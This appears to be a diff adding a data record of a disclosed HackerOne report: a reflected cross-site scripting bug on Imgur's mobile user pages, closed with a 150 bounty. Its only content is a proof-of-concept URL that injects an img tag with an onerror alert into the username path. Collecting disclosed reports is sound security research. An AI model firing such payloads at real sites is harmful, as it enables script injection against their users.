@@ -1,0 +1,15 @@
+ReportLink:https://hackerone.com/reports/106982
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/charfee
+ReportedTo:Imgur(imgur)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:19.01.2016 18:06:58
+
+Summary:
+
+hi 
+poc :
+
+http://m.imgur.com/user/phoenixrachel%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E
